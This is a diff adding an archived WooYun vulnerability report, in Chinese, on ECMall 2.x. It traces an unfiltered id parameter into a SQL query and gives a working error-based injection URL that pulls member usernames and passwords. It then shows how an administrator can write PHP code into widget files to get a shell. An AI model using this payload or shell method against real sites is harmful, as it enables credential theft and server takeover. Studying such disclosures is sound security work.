@@ -1,0 +1,306 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		ecmall 2.x通杀SQL注入至后台getshell  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		ecmall 2.x通杀SQL注入至后台getshell  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/Chora">Chora</a> 
+</li><li>提交时间：		2013-09-18 22:39</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-09-18：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-09-20：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-09-23：	细节向第三方安全合作伙伴开放<br/>
+									2013-09-30：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-10-10：	细节向普通白帽子公开<br/>
+									2013-10-30：	细节向实习白帽子公开<br/>
+									2013-12-17：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">ecmall 2.x通杀SQL注入至后台getshell</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">app/buyer_groupbuy.app.php<br />
+<br />
+</p><pre><code>function exit_group()<br />
+    {<br />
+        $id = empty($_GET[&#039;id&#039;]) ? 0 : $_GET[&#039;id&#039;]; //没过滤你懂的。<br />
+        if (!$id)<br />
+        {<br />
+            $this-&gt;show_warning(&#039;no_such_groupbuy&#039;);<br />
+            return false;<br />
+        }<br />
+<br />
+        // 判断是否能退团<br />
+        if (!$this-&gt;_ican($id, ACT)) //跟进<br />
+        {<br />
+            $this-&gt;show_warning(&#039;Hacking Attempt&#039;);<br />
+            return;<br />
+        }<br />
+......<br />
+    }<br />
+function _ican($id, $act = &#039;&#039;)<br />
+    {<br />
+......<br />
+        $group = current($this-&gt;_member_mod-&gt;getRelatedData(&#039;join_groupbuy&#039;, $this-&gt;visitor-&gt;info[&#039;user_id&#039;], array(<br />
+                &#039;conditions&#039; =&gt; &#039;gb.group_id=&#039; . $id, //带入<br />
+                &#039;order&#039; =&gt; &#039;gb.group_id DESC&#039;,<br />
+                &#039;fields&#039; =&gt; &#039;gb.state,groupbuy_log.order_id&#039;<br />
+        )));<br />
+......<br />
+    }</code></pre><p class='detail'><br />
+<br />
+eccore/model/mode.base.php<br />
+<br />
+</p><pre><code>function getRelatedData($relation_name, $ids, $find_param = array())<br />
+    {<br />
+......<br />
+        /* 构造查询条件 */<br />
+        $conditions = $alias . &#039;.&#039; . $relation_info[&#039;foreign_key&#039;] . &#039; &#039; . db_create_in($ids);   //主键值限定<br />
+        $conditions .= $relation_info[&#039;ext_limit&#039;] ?<br />
+                            &#039; AND &#039; . $this-&gt;_getExtLimit($relation_info[&#039;ext_limit&#039;], $alias)<br />
+                            : &#039;&#039;;<br />
+        $conditions .= is_string($find_param[&#039;conditions&#039;]) ? &#039; AND &#039; . $find_param[&#039;conditions&#039;] : &#039;&#039;;<br />
+        $find_param[&#039;conditions&#039;] = $conditions; //带入<br />
+......<br />
+ return $model-&gt;find($find_param);//跟进<br />
+    }<br />
+    function find($params = array())<br />
+    {<br />
+        extract($this-&gt;_initFindParams($params));<br />
+<br />
+        /* 字段(SELECT FROM) */<br />
+        $fields = $this-&gt;getRealFields($fields);<br />
+        $fields == &#039;&#039; &amp;&amp; $fields = &#039;*&#039;;<br />
+<br />
+        $tables = $this-&gt;table . &#039; &#039; . $this-&gt;alias;<br />
+<br />
+        /* 左联结(LEFT JOIN) */<br />
+        $join_result = $this-&gt;_joinModel($tables, $join);<br />
+<br />
+        /* 原来为($join_result || $index_key)，忘了最初的用意，默认加上主键应该是只为了为获得索引的数组服务的，因此只跟索引键是否是主键有关 */<br />
+        if ($index_key == $this-&gt;prikey || (is_array($index_key) &amp;&amp; in_array($this-&gt;prikey, $index_key)))<br />
+        {<br />
+            /* 如果索引键里有主键，则默认在要查询字段后加上主键 */<br />
+            $fields .= &quot;,{$this-&gt;alias}.{$this-&gt;prikey}&quot;;<br />
+        }<br />
+<br />
+        /* 条件(WHERE) */<br />
+        $conditions = $this-&gt;_getConditions($conditions, true);<br />
+<br />
+        /* 排序(ORDER BY) */<br />
+        $order &amp;&amp; $order = &#039; ORDER BY &#039; . $this-&gt;getRealFields($order);<br />
+<br />
+        /* 分页(LIMIT) */<br />
+        $limit &amp;&amp; $limit = &#039; LIMIT &#039; . $limit;<br />
+        if ($count)<br />
+        {<br />
+            $this-&gt;_updateLastQueryCount(&quot;SELECT COUNT(*) as c FROM {$tables}{$conditions}&quot;);<br />
+        }<br />
+<br />
+        /* 完整的SQL */<br />
+        $sql = &quot;SELECT {$fields} FROM {$tables}{$conditions}{$order}{$limit}&quot;;<br />
+<br />
+        return $index_key ? $this-&gt;db-&gt;getAllWithIndex($sql, $index_key) :<br />
+                            $this-&gt;db-&gt;getAll($sql);<br />
+//带入查询,结束.<br />
+    }</code></pre><p class='detail'><br />
+<br />
+http://localhost/ecmall/index.php?app=buyer_groupbuy&amp;act=exit_group&amp;id=1 union select 1 from (select count(*),concat(floor(rand(0)*2),(select concat(user_name,password) from ecm_member limit 0,1))a from information_schema.tables group by a)b<br />
+<br />
+<br />
+<br />
+后台GETSHELL的话就太多了没细看,因为是后台权限没多少用,只举一列.<br />
+<br />
+</p><pre><code>function edit()<br />
+    {<br />
+        $name = empty($_GET[&#039;name&#039;]) ? 0 : trim($_GET[&#039;name&#039;]);<br />
+        if (!$name)<br />
+        {<br />
+            $this-&gt;show_warning(&#039;no_such_widget&#039;);<br />
+<br />
+            return;<br />
+        }<br />
+        $script_file = $this-&gt;_get_file($name, $_GET[&#039;file&#039;]);<br />
+        if (!IS_POST)<br />
+        {<br />
+            $this-&gt;assign(&#039;code&#039;, file_get_contents($script_file));<br />
+            $this-&gt;display(&#039;widget.form.html&#039;);<br />
+        }<br />
+        else<br />
+        {<br />
+            if (!file_put_contents($script_file, stripslashes($_POST[&#039;code&#039;])))<br />
+            {<br />
+                $this-&gt;show_warning(&#039;edit_file_failed&#039;);<br />
+<br />
+                return;<br />
+            }<br />
+<br />
+            $this-&gt;show_message(&#039;edit_file_successed&#039;);<br />
+        }<br />
+    }<br />
+    function _get_file($name, $type = &#039;script&#039;)<br />
+    {<br />
+        $file = ROOT_PATH . &#039;/external/widgets/&#039; . $name;<br />
+        switch ($type)<br />
+        {<br />
+            case &#039;script&#039;:<br />
+                return $file . &#039;/main.widget.php&#039;;<br />
+            break;<br />
+            case &#039;template&#039;:<br />
+                return $file . &#039;/widget.html&#039;;<br />
+            break;<br />
+        }<br />
+    }</code></pre><p class='detail'><br />
+<br />
+直接访问http://localhost/ecmall/admin/index.php?app=widget&amp;act=edit&amp;name=advt&amp;file=script修改就行,对应的地址是http://localhost/ecmall/external/widgets/advt/main.widget.php </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">注入的前提是登陆会员，不过默认都开启了注册功能。<br />
+<br />
+</p><p class="detail"><a href="../images/182224108ac731cf4dad996c7c15a644ba43ad77.jpg" target="_blank"><img src="../images/182224108ac731cf4dad996c7c15a644ba43ad77.jpg" alt="1.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/1822243742a0213e367c0d8b2964833b836a17cf.jpg" target="_blank"><img src="../images/1822243742a0213e367c0d8b2964833b836a17cf.jpg" alt="2.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/182224567329657b0b51c6c9d1c0ae3fe486edd6.jpg" target="_blank"><img src="../images/182224567329657b0b51c6c9d1c0ae3fe486edd6.jpg" alt="3.jpg" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">潜水很久混个脸熟- -。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/Chora" title="Chora">Chora</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-037510" title="ecmall 2.x通杀SQL注入至后台getshell">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：16 </p>
+													<p class="detail">确认时间：2013-09-20 11:43</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感谢您为shopex信息安全做的贡献<br />
+我们将尽快修复<br />
+非常感谢</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="37510";
+var bugRating="-3";
+var myRating="";
+var ratingCount="2";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
